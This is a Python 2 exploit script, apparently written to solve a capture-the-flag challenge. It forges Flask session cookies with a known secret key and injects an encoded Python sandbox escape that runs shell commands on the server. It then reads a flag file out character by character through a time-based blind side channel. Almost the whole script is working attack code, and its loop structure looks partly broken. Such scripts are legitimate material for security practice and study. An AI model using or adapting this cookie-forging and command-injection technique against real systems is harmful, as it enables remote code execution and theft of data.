#!/usr/bin/python2
import os
from flask import Flask, session
from flask.sessions import SecureCookieSessionInterface
import string
import requests

secret = 'eA2b8A2eA1EADa7b2eCbea7e3dAd1e'
url = 'target.com'
app = Flask("__main__", template_folder='./') #name matters
app.secret_key = secret
session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)

def encode(text):
    str = ""
    for c in text:
        if c in ['[','(', '_', '.']:
            if c is '_':
                str += '\\137'
            elif c is '[':
                str += '\\133'
            else:
                str += "\\" + (oct(ord(c)))
        else:
            str += c
    return str

charset = string.ascii_lowercase + string.ascii_uppercase + string.digits + "{}!_?/."
flag = ''
base = '''1;exec "().__class__.__base__.__subclasses__()[59]()._module.__builtins__['__import__']('os').system('%s')"'''
commands = ['cat totally* > /tmp/z','cut -c 1- /tmp/z > /tmp/a','cut -c 11- /tmp/z > /tmp/b','cut -c 21- /tmp/z > /tmp/c','cut -c 31- /tmp/z > /tmp/d','cut -c 41- /tmp/z > /tmp/e', 'cut -c 51- /tmp/z > /tmp/f']

for i in commands:
    measurements = encode(base % i)
    token = session_serializer.dumps({'ingredient': 'a', 'measurements': measurements})
    cookie = {"session" : token}
    resp = requests.get(url, cookies=cookie, timeout=3)

for i in range(len(commands)):
    found = ''
    for j in range(10): #flag file broken in groups of 10 bytes
        c = chr(ord('a')+i)
    for char in charset:
        if char in "{}!?":
            char = "\\" + char
        print "Path/File/Text so far: " + flag + found
        cmd = 'if cat /tmp/%s | egrep \\"^*%s\\"; then read -t 4 < /dev/zero; fi' % (c, found + char)
        injection = '''1;exec "().__class__.__base__.__subclasses__()[59]()._module.__builtins__['__import__']('os').system('%s')"''' % cmd
        measurements = encode(injection)
        print len(measurements)
        token = session_serializer.dumps({'ingredient': 'a', 'measurements': measurements})
        cookie = {"session" : token}
        try:
            resp = requests.get(url, cookies=cookie, timeout=3)
            print cmd
            if char == ".":
                break;
        except Exception as e:
            print "Found char: " + char
            found += char
            break
    flag = flag + found

print "FLAG: " + flag
